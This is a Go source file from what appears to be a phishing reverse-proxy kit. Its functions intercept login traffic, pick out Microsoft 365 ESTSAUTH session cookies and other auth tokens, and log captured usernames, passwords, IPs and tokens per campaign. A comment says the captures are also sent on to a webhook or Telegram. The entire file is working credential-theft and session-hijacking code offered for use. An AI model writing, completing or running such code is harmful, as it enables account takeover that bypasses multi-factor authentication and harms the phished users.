package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
)

var fileMu sync.Mutex

func (s *Session) MarkDone() {
	s.mu.Lock()
	s.IsDone = true
	s.mu.Unlock()
}

// captureAuthTokens intercepts and saves authentication cookies
func captureAuthTokens(resp *http.Response, s *Session, target *Target, r *http.Request) {
	if s == nil {
		return
	}

	capturedAny := false
	cookies := resp.Cookies()
	for _, ck := range cookies {
		if ck.Value == "" {
			continue
		}
		
		isMicrosoftAuth := target.Name == "Microsoft 365" && (ck.Name == "ESTSAUTH" || ck.Name == "ESTSAUTHPERSISTENT" || ck.Name == "ESTSAUTHLIGHT")
		
		if s.ReachedService || target.AuthTokenNames[ck.Name] || isMicrosoftAuth {
			s.AddToken(ck.Name, ck.Value)
			capturedAny = true
			fmt.Printf("[+] [%d] [%s] AUTH TOKEN: %s = %s\n",
				s.Index, target.Name, ck.Name, truncate(ck.Value, 40))
		}
	}

	username, password, _, tokens, alreadyDone := s.Snapshot()

	// When the session is complete, mark it done and save
	if !alreadyDone && isSessionComplete(target, password, s.ReachedService, tokens, capturedAny) {
		s.MarkDone()
		fmt.Printf("\n[!!!] [%d] [%s] SESSION COMPLETE — TOKENS CAPTURED\n", s.Index, target.Name)
		fmt.Printf("[!!!] Username: %s\n", username)
		fmt.Printf("[!!!] Password: %s\n", password)
		fmt.Printf("[!!!] Tokens:   %d cookies captured\n\n", len(tokens))
		
		// Pass 'r' to saveTokens
		saveTokens(s, target, r)
	}
}

func isSessionComplete(target *Target, password string, reachedService bool, tokens map[string]string, capturedAny bool) bool {
	if target.Name == "Microsoft 365" {
		_, hasEstsAuth := tokens["ESTSAUTH"]
		_, hasEstsAuthPersistent := tokens["ESTSAUTHPERSISTENT"]
		_, hasEstsAuthLight := tokens["ESTSAUTHLIGHT"]
		return password != "" && (hasEstsAuth || hasEstsAuthPersistent || hasEstsAuthLight)
	}

	if len(target.CompletionCookies) > 0 {
		if password == "" {
			return false
		}
		for _, c := range target.CompletionCookies {
			if v, ok := tokens[c]; ok && v != "" && v != "Disabled" {
				return true
			}
		}
		if target.ServiceUpstream != "" {
			return reachedService && capturedAny
		}
		return false
	}

	if target.ServiceUpstream != "" {
		return password != "" && reachedService && capturedAny
	}

	return password != "" && capturedAny
}

// saveTokens writes to the local file and triggers the final webhook/Telegram alert
func saveTokens(s *Session, target *Target, r *http.Request) {
	username, password, campaignID, tokens, _ := s.Snapshot()

	entry := fmt.Sprintf("\n[%s] [%s] SESSION #%d — FULL CAPTURE\n",
		s.CreatedAt.Format("2006-01-02 15:04:05"), target.Name, s.Index)
	entry += fmt.Sprintf("  Campaign: %s\n", campaignID)
	entry += fmt.Sprintf("  Username: %s\n", username)
	entry += fmt.Sprintf("  Password: %s\n", password)
	entry += fmt.Sprintf("  IP:       %s\n", s.IP)
	entry += fmt.Sprintf("  UA:       %s\n", s.UserAgent)
	entry += fmt.Sprintf("  Tokens:\n")
	for name, value := range tokens {
		entry += fmt.Sprintf("    %s = %s\n", name, value)
	}
	entry += "\n"

	appendToFile(credLogFile, entry)

	// 🚨 CRITICAL FIX: Unconditionally call emitCapture here.
	// This is 100% safe because saveTokens is ONLY called when isSessionComplete is true.
	// emitCapture still has its own "if !done || len(tokens) == 0" safeguard at the top, 
	// guaranteeing it will never spam or fire prematurely for Yahoo or any other provider.
	emitCapture(s, target, r)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func appendToFile(filename, content string) {
	fileMu.Lock()
	defer fileMu.Unlock()
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(content)
}